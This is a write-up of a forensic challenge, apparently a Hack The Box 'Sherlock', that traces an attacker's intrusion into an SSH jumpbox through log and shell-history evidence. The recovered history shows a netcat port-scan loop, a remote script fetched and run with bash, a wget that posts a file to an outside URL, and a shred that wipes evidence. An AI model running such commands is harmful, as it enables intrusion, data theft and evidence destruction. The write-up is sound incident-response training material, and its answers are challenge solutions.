# SSHole

**1. What Linux distribution name and version was the targeted server running?**\
Ans: Alpine Linux 3.24.3

Solution:

```bash
┌──(kali㉿kali)-[~/htb/sherlocks/SSHole/etc]
└─$ cat os-release 
NAME="Alpine Linux"
ID=alpine
VERSION_ID=3.24.3
PRETTY_NAME="Alpine Linux v3.24"
HOME_URL="https://alpinelinux.org/"
BUG_REPORT_URL="https://gitlab.alpinelinux.org/alpine/aports/-/issues"
```

---

**2. What is the CVE ID of the vulnerability abused by the attacker to gain access?**\
Ans: CVE-2026-123158

---

**3. When did the attacker exploit the vulnerability?**\
Ans: 2026-11-06 11:27:08

Solution:

```bash
┌──(kali㉿kali)-[~/…/sherlocks/SSHole/var/log]
└─$ cat messages | grep -i "adminsvc"
Nov  6 11:27:05 dev-jumpbox auth.info sshd-session[4852]: Failed password for adminsvc from 192.168.72.1 port 61351 ssh2
Nov  6 11:27:08 dev-jumpbox auth.info sshd-session[4852]: Accepted password for adminsvc from 192.168.72.1 port 61351 ssh2
Nov  6 12:20:02 dev-jumpbox auth.info sshd-session[4854]: Disconnected from user adminsvc 192.168.72.1 port 61351
```

---

**4. Which user account was abused by the attacker?**\
Ans: adminsvc

Solution: Refer to Task 3

---

**5. What string value causes the authentication bypass?**\
Ans: *

---

**6. What command did the attacker use to scan the network reachable via the jumpbox, allowing them to target internal developer systems?**\
Ans: for ip in {1..254}; do nc -zvw 1 192.168.18.$ip 1-65535 2>&1 | grep -E "succeeded|open"; done

Solution:

```bash
┌──(kali㉿kali)-[~/…/sherlocks/SSHole/home/adminsvc]
└─$ cat .ash_history                 
ls -la
for ip in {1..254}; do nc -zvw 1 192.168.18.$ip 1-65535 2>&1 | grep -E "succeeded|open"; done
vi scanreport.txt
cat scanreport.txt 
bash <(wget -qO- https://raw.githubusercontent.com/papinyurii33/devscripts/refs/heads/main/setup.sh)
ls -la /tmp
ls -l /tmp/.devenv
wget --post-file=/tmp/.devenv -O- https://devv.coding.eu/process
shred -u /tmp/.devenv
exit
```

---

**7. What was the exfiltration URI where the attacker exfiltrated a sensitive file?**
Ans: https://devv.coding.eu/process

Solution: Refer to task 6
